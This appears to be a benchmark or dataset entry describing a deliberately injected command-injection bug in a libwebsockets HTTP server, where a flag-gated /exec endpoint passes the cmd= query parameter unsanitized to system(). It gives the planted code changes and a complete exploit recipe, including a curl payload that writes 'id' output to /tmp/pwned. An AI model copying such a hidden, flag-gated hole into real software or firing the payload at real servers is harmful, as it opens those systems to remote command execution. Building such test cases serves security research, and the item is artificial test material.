DESCRIPTION:
  CLI-flag-gated command injection in a libwebsockets HTTP server. The server
  must be started with --exec-mode for the vulnerable /exec endpoint to be
  reachable. A user-supplied URL query parameter (cmd=) is staged through an
  intermediate snprintf buffer then passed to system() with no sanitization.

CONFIG_GATE (C3 — three flags + utility function):
  mechanism:  Three CLI flags: --exec-mode (exec_enabled), --exec-verbose
              (exec_verbose), --exec-timeout (exec_timeout) stored in three
              separate global ints. A utility function exec_is_active() checks
              exec_enabled and logs diagnostics when exec_verbose is set.
  check:      `if (exec_is_active() && strncmp(in, "/exec", 5) == 0 ...)`
  complexity: three globals, one helper function, no struct, no file parsing

INPUT_FLOW (I2 — snprintf buffer then system()):
  entry:      HTTP GET /exec?cmd=<payload>  →  lws_get_urlarg_by_name_safe()
  path:       handle_exec() extracts "cmd" URL arg into char raw[256]
              snprintf(cmd, sizeof(cmd), "%s", raw) copies to cmd[320] buffer
              system(cmd) is called with the intermediate buffer
  transforms: URL arg decode by lws, then snprintf copy (no truncation risk
              given sizes, no modification of content)

SANITIZATION (S1 — none):
  none

SINK:        system() inside handle_exec() in server.c

CHANGED FILES:
  server.c — 4 hunks:
    1. three global ints: exec_enabled, exec_verbose, exec_timeout
    2. exec_is_active() utility function (C3)
    3. handle_exec(): URL arg → raw[] → snprintf → cmd[] → system() (I2)
    4. callback_http(): C3 gate using exec_is_active()
    5. main(): --exec-mode, --exec-verbose, --exec-timeout flag parsing

EXPLOIT:
  build:   bash build.sh
  start:   ./lws_server --port 18107 --wwwroot /tmp/www --exec-mode
  trigger: curl 'http://127.0.0.1:18107/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes /exec to fall through to the
               file-serving mount and return 404.

NOTES:
  - system() output goes to the server's stderr (inherited fd), not the
    HTTP response body. Use a write-to-file payload to confirm blind execution.
  - The snprintf(cmd, sizeof(cmd), "%s", raw) copy (I2) adds no sanitization;
    all shell metacharacters pass through unchanged.
  - lws_get_urlarg_by_name_safe() URL-decodes the argument.
